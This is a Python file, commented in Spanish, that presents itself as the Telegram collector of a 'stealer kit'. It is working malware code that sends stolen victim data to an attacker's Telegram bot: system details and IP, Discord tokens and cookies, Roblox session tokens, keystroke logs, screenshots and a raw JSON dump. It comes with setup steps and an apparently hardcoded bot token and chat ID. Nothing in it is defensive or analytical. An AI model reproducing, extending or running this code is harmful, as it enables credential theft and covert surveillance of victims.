#!/usr/bin/env python3
"""
STEALER KIT - TELEGRAM BOT COLLECTOR
Envia todos los datos robados a Telegram
No necesita tu PC encendida

Setup:
1. Crear bot: https://t.me/BotFather -> /newbot -> copiar TOKEN
2. Tu chat_id: https://t.me/userinfobot
3. Pegar abajo
"""

import requests
import json
import os
import base64
from datetime import datetime

# ============================================
# CONFIGURACION - PEGA TUS VALORES
# ============================================
BOT_TOKEN = "8785045003:AAGsICsqOyT3t_luH2Y4WQSJ746dnbZZby4"
CHAT_ID = "8445047233"

def send_telegram(text, parse_mode="HTML"):
    """Envía mensaje al bot de Telegram"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": parse_mode
    }
    try:
        r = requests.post(url, json=payload, timeout=10)
        return r.status_code == 200
    except:
        return False

def send_file_from_path(file_path, caption=""):
    """Envía archivo desde ruta"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            r = requests.post(url, files={"document": f}, data={
                "chat_id": CHAT_ID, "caption": caption
            }, timeout=15)
            return r.status_code == 200
    except:
        return False

def send_file_from_bytes(data_bytes, filename, caption=""):
    """Envía datos como archivo"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        import io
        files = {"document": (filename, io.BytesIO(data_bytes))}
        r = requests.post(url, files=files, data={
            "chat_id": CHAT_ID, "caption": caption
        }, timeout=15)
        return r.status_code == 200
    except:
        return False

# ============================================
# FORMATEADORES
# ============================================

def format_victim_report(data):
    """Formatea el reporte completo de víctima"""
    sys = data.get('System', {})
    toks = data.get('Tokens', {})
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    msg = f"🔓 <b>NUEVA VICTIMA</b> 🔓\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"⏰ <b>Hora:</b> {timestamp}\n"
    msg += f"👤 <b>Usuario:</b> <code>{sys.get('Username', 'N/A')}</code>\n"
    msg += f"💻 <b>PC:</b> <code>{sys.get('Hostname', 'N/A')}</code>\n"
    msg += f"🖥️ <b>OS:</b> <code>{sys.get('OS', 'N/A')}</code>\n"
    msg += f"🎮 <b>RAM:</b> <code>{sys.get('RAM_GB', 'N/A')}GB</code>\n"
    msg += f"🌐 <b>IP:</b> <code>{sys.get('IP', 'N/A')}</code>\n"

    # Discord tokens
    discord = toks.get('Discord', [])
    if discord:
        msg += f"\n💬 <b>Discord Tokens:</b> ({len(discord)})\n"
        for i, t in enumerate(discord, 1):
            msg += f"└─ <code>{t[:30]}...</code>\n"

    # Discord cookies
    dc_cookies = toks.get('DiscordCookies', [])
    if dc_cookies:
        msg += f"\n🍪 <b>Discord Cookies:</b> ({len(dc_cookies)})\n"
        for c in dc_cookies:
            msg += f"└─ <code>{c[:30]}...</code>\n"

    # Roblox tokens
    rbx_tokens = toks.get('RobloxTokens', [])
    if rbx_tokens:
        msg += f"\n🎮 <b>Roblox Tokens:</b> ({len(rbx_tokens)})\n"
        for t in rbx_tokens:
            msg += f"└─ <code>{t[:30]}...</code>\n"

    # Roblox sessions
    rbx_sessions = toks.get('RobloxSession', [])
    if rbx_sessions:
        msg += f"\n🎮 <b>Roblox Sessions:</b> ({len(rbx_sessions)})\n"
        for s in rbx_sessions:
            msg += f"└─ <code>{s[:30]}...</code>\n"

    # Keylog
    keylog = data.get('Keystrokes', '')
    if keylog and len(keylog) > 0:
        msg += f"\n⌨️ <b>Keylog:</b> ({len(keylog)} chars)\n"
        kl_file = f"/tmp/kl_{datetime.now().strftime('%Y%m%d%H%M%S')}.txt"
        try:
            with open(kl_file, 'w') as f:
                f.write(keylog[:10000])
            send_file_from_path(kl_file, f"Keylog - {sys.get('Username', 'N/A')}")
            os.remove(kl_file)
        except:
            pass

    return msg

def format_keylog_only(keylog, username="unknown"):
    """Formatea solo el keylog para enviar"""
    if not keylog:
        return None

    chunks = [keylog[i:i+4000] for i in range(0, len(keylog), 4000)]
    messages = []
    for chunk in chunks:
        msg = f"⌨️ <b>Keylog - {username}</b>\n"
        msg += f"{'━'*30}\n"
        msg += chunk
        messages.append(msg)
    return messages

def format_screenshot(data):
    """Maneja screenshots como archivos"""
    screenshot = data.get('Screenshot')
    if not screenshot:
        return False
    try:
        if isinstance(screenshot, str):
            img_bytes = base64.b64decode(screenshot)
            ts = datetime.now().strftime('%Y%m%d%H%M%S')
            path = f"/tmp/screen_{ts}.png"
            with open(path, 'wb') as f:
                f.write(img_bytes)
            send_file_from_path(path, f"Screenshot - {data.get('System', {}).get('Username', 'N/A')}")
            os.remove(path)
            return True
    except:
        return False

# ============================================
# MAIN - PROCESA Y ENVIA TODO
# ============================================

def collect_and_send(stolen_data):
    """Recibe el diccionario completo de datos robados y envía todo"""

    # 1. Reporte principal
    msg = format_victim_report(stolen_data)
    send_telegram(msg)

    # 2. Keylog como archivo separado
    keylog = stolen_data.get('Keystrokes', '')
    if keylog:
        keylog_msgs = format_keylog_only(keylog, stolen_data.get('System', {}).get('Username', 'unknown'))
        if keylog_msgs:
            for m in keylog_msgs[:3]:
                send_telegram(m)

    # 3. Screenshot
    format_screenshot(stolen_data)

    # 4. Enviar datos crudos como backup
    try:
        raw_json = json.dumps(stolen_data, indent=2, ensure_ascii=False)
        if raw_json:
            ts = datetime.now().strftime('%Y%m%d%H%M%S')
            raw_file = f"/tmp/raw_{ts}.json"
            with open(raw_file, 'w') as f:
                f.write(raw_json)
            send_file_from_path(raw_file, f"Raw Data - {stolen_data.get('System', {}).get('Username', 'N/A')}")
            os.remove(raw_file)
    except:
        pass

    return True

# === EJECUCION DIRECTA ===
if __name__ == "__main__":
    test_data = {
        "System": {"Username": "test", "Hostname": "TEST-PC", "OS": "Windows 10", "RAM_GB": 8, "IP": "127.0.0.1"},
        "Tokens": {"Discord": ["test_token_123"], "RobloxSession": ["test_session_456"]},
        "Keystrokes": "[TEST] Teclas capturadas\n",
        "Screenshot": None
    }
    print("[*] Probando conexion con Telegram...")
    result = collect_and_send(test_data)
    if result:
        print("[+] Datos enviados exitosamente!")
    else:
        print("[!] Error al enviar. Verifica BOT_TOKEN y CHAT_ID")
